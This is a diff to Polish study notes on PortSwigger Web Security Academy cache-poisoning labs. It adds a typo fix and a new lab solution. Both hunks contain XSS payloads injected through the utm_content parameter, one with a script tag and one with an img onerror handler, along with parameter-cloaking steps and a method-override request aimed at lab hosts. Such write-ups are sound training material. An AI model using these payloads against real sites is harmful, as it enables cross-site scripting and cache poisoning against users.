@@ -704,7 +704,7 @@ GET /?utm_content='><script>alert(1)</script>
 ## Lab: Parameter cloaking
 1. Używając Param Minera -> `Guess GET Parameters`, znajdujemy parametr, który nie wpływa na cachowanie, jest to utm_content
 2. Znajdujemy plik /js/geolocate.js, który wywoływany jest przy ładownaiu strony zapytaniem /js/geolocate?callback=setCountryCookie
-3. Próbując wpisywać różne payloady zayważamy, że `;` nie przerywa zapytania, a jest interpretowany jako dalsza część parametru
+3. Próbując wpisywać różne payloady zauważamy, że `;` nie przerywa zapytania, a jest interpretowany jako dalsza część parametru
 4. Inaczej jest jednak na back endzie, gdzie jest interpretowany jako przerwa i następuje po nim inna zmienna
 5. Dodatkowo jeżeli znienne mają takie same nazwy pierwsza zostaje nadpisana przez drugą, jednak w cachu zostaje zapamiętana pierwsza z nich
 6. Konstruujemy zatem payload
@@ -735,6 +735,13 @@ Host: innocent-website.com
 X-HTTP-Method-Override: POST
 …
 param=bad-stuff-here
+```
+
+## Lab: Web cache poisoning via an unkeyed query parameter
+Prostsze rozwiązanie, które również działa: (normalne: https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection)
+```html
+GET /login?lang=en?utm_content='><img+src%3d1+onerror%3d'alert() HTTP/1.1
+Host: 0a670087039215fac0843c0d00c6005a.web-security-academy.net
 ```
 
 ## Lab: URL normalization
